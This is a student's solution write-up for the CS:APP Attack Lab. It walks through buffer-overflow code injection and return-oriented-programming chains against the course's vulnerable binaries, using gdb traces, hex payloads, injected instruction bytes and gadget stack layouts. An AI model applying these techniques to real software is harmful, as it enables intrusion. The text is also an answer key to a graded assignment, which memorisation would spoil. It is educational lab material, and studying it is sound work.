# Attack Lab Solution

## CI Level 1

Before any analysis, just run the program first. Add the `-q` option to disable reporting the results. It is expected to exit normally. We need to find out how to exploit the buffer overflow to reach `touch1`.
```
$ ./ctarget -q
Cookie: 0x59b997fa
Type string:123
No exploit.  Getbuf returned 0x1
Normal return
```

Dump the asm code.
```sh
objdump -d ctarget > ctarget.txt
```

Look at the `getbuf` method. It allocates a 40-byte buffer and reads a string from stdin. So the return address will be at `buf+40`.
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

Let's gdb into it to verify this idea.
```
gdb --args ./ctarget -q
(gdb) b *0x4017b4
(gdb) layout asm
(gdb) r
Type string:01234567890123456789
(gdb) x/20wx $rsp
0x5561dc78:     0x33323130      0x37363534      0x31303938      0x35343332
0x5561dc88:     0x39383736      0x00000000      0x00000000      0x00000000
0x5561dc98:     0x55586000      0x00000000      0x00401976      0x00000000
0x5561dca8:     0x00000002      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
(gdb) bt
#0  getbuf () at buf.c:16
#1  0x0000000000401976 in test () at visible.c:92
#2  0x0000000000401f24 in launch (offset=<optimized out>) at support.c:295
#3  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
Backtrace stopped: Cannot access memory at address 0x55686000
```

It shows that `rsp+40` stores `0x00401976`, which is exactly the return address to frame 1. We need to overwrite it to the `touch1` address `0x004017c0`. Write the hex representation of input in `c1.txt`. Be aware of the endianness!
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```

Then run the below script, and the test is passed.
```sh
./hex2raw < ../c1.txt | ./ctarget -q
```

## CI Level 2

We need to pass the cookie as an integer argument into `touch2` to pass the validation. Instead of directly returning to `touch1` in level 1, we need to execute a `mov` instruction to set the argument before reaching `touch2`. This can be achieved by injecting a `mov` instruction followed by `ret`, so that we can first jump into this injected code, set the cookie as argument, and finally return to `touch2`.

To get the byte code, write an asm file, compile it and objdump it. My cookie is `0x59b997fa`.
```
$ cat c2.s
mov $0x59b997fa,%rdi
ret
$ gcc -c c2.s && objdump -d c2.o
...
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   c3                      retq  
```

We put this code snippet at the beginning of the buffer, which is always at `0x5561dc78` on the stack. We also need to push two addresses, pointing the first one to the injected code, and the second to the `touch2`. The answer is at [c2.txt](c2.txt).

Use gdb to examine the injected code.
```
./hex2raw < ../c2.txt > c2
gdb --args ./ctarget -q -i c2
(gdb) b *0x4017b4
(gdb) r
(gdb) x/2i $rsp
   0x5561dc78:  mov    $0x59b997fa,%rdi
   0x5561dc7f:  retq  
```

The memory layout is shown below before returning from `getbuf`.
```
# text:
00000000004017a8 <getbuf>:
  ...
> 4017bd:	c3                   	retq

00000000004017ec <touch2>:
  ...

# stack:
            +-----------------------------+
            |     0x00000000'004017ec     |
0x5561dca8  +-----------------------------+ <- rsp+0x8 (buf+0x30)
            |     0x00000000'5561dc78     |
0x5561dca0  +-----------------------------+ <- rsp (buf+0x28)
            |             ...             |
            +-----------------------------+
            | mov $0x59b997fa,%rdi + retq |
0x5561dc78  +-----------------------------+ <- rsp-0x28 (buf)
```

## CI Level 3

Need to pass a string pointer to `touch3` that matches the hexadecimal representation of the cookie. Just like level 2, we put the code at `buf`, but at level 3 we cannot place the string within the `buf` area, because when `getbuf` returned, the `buf` is below the stack pointer. Other functions might allocate this stack area and overwrite the data within it. To make the string safe, we put it at `buf+0x38` just after the return address. See [c3.txt](c3.txt).

The memory snapshot before returning from `getbuf`.
```
# text:
00000000004017a8 <getbuf>:
  ...
> 4017bd:	c3                   	retq

00000000004018fa <touch3>:
  ...

# stack:
            +-----------------------------+
            |          "59b997fa"         |
0x5561dcb0  +-----------------------------+ <- rsp+0x10 (buf+0x38)
            |     0x00000000'004018fa     |
0x5561dca8  +-----------------------------+ <- rsp+0x8 (buf+0x30)
            |     0x00000000'5561dc78     |
0x5561dca0  +-----------------------------+ <- rsp (buf+0x28)
            |             ...             |
            +-----------------------------+
            | mov $0x5561dcb0,%rdi + retq |
0x5561dc78  +-----------------------------+ <- rsp-0x28 (buf)
```

## ROP Level 2

In `rtarget`, ASLR is enabled and stack segment is nonexecutable. We need use the gadgets to pass the cookie into `touch2`. Store the cookie on stack and use `popq` to pass it into a register. Then move the data to `$rdi`, and finally jump to `touch2`. See [r2.txt](r2.txt).
```
# text:
00000000004017a8 <getbuf>:
  ...
> 4017bd:	c3                   	retq

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

# (gdb) x/3i 0x004019ab
   0x4019ab <addval_219+4>:     pop    %rax
   0x4019ac <addval_219+5>:     nop
   0x4019ad <addval_219+6>:     retq

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

# (gdb) x/3i 0x004019c5
   0x4019c5 <setval_426+2>:     mov    %rax,%rdi
   0x4019c8 <setval_426+5>:     nop
   0x4019c9 <setval_426+6>:     retq

00000000004017ec <touch2>:
  ...

# stack:
+-----------------------+
|  0x00000000'004017ec  |
+-----------------------+ <- rsp+0x18
|  0x00000000'004019c5  |
+-----------------------+ <- rsp+0x10
|  0x00000000'59b997fa  | (cookie)
+-----------------------+ <- rsp+0x8
|  0x00000000'004019ab  |
+-----------------------+ <- rsp (buf+0x28)
```

## ROP Level 3

Need to pass a string as argument to `touch3` in `rtarget`. The string have to be put on stack, but the stack address is randomized. Therefore, we need to calculate the string address by adding a constant offset to `%rsp`. We can make use of the `add_xy` function in the farm. However, to call the function, we need to put the operands into `%rdi` and `%rsi`.

Checkout all possible data movement in the farm. There are connected paths from `rax` to `rdi` and from `eax` to `esi`.
```
                 popq
                   | 58
      48 89 e0     v   48 89 c7
%rsp ----------> %rax ----------> %rdi

        89 e0            89 c2            89 d1            89 ce
%esp ----------> %eax ----------> %edx ----------> %ecx ----------> %esi
                   |
                   +------------> %edi
                         89 c7
```

Just put the stack address into `rdi` and the offset into `esi`, call `add_xy`, move the result from `rax` to `rdi`, and finally jump to `touch3`. That's it. The answer is at [r3.txt](r3.txt).
```
# text:
00000000004017a8 <getbuf>:
  ...
> 4017bd:	c3                   	retq

# stack:
+-----------------------+
|      "59b997fa"       | cookie string
+-----------------------+ <- rsp+0x50
|  0x00000000'004018fa  | touch3
+-----------------------+ <- rsp+0x48
|  0x00000000'004019a2  | mov %rax,%rdi
+-----------------------+ <- rsp+0x40
|  0x00000000'004019d6  | add_xy
+-----------------------+ <- rsp+0x38
|  0x00000000'00401a13  | mov %ecx,%esi
+-----------------------+ <- rsp+0x30
|  0x00000000'00401a69  | mov %edx,%ecx
+-----------------------+ <- rsp+0x28
|  0x00000000'004019dd  | mov %eax,%edx
+-----------------------+ <- rsp+0x20
|  0x00000000'00000048  | offset = (rsp+0x50) - (rsp+0x08) = 0x48
+-----------------------+ <- rsp+0x18
|  0x00000000'004019ab  | popq %rax
+-----------------------+ <- rsp+0x10
|  0x00000000'004019a2  | mov %rax,%rdi
+-----------------------+ <- rsp+0x8
|  0x00000000'00401a06  | mov %rsp,%rax
+-----------------------+ <- rsp (buf+0x28)
```
